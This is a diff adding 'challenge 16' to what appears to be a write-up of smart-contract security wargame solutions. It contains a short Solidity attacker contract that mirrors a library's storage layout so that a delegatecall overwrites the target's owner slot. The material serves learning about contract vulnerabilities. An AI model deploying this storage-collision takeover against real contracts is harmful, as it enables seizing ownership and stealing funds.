@@ -137,3 +137,20 @@ contract Attacker {
     }
 }
 ```
+
+
+### challenge 16
+
+most difficult until now... 
+
+```
+contract Attacker {
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+
+  function setTime(uint256 _address) public {
+    owner = address(uint160(_address));
+  }
+}
+```
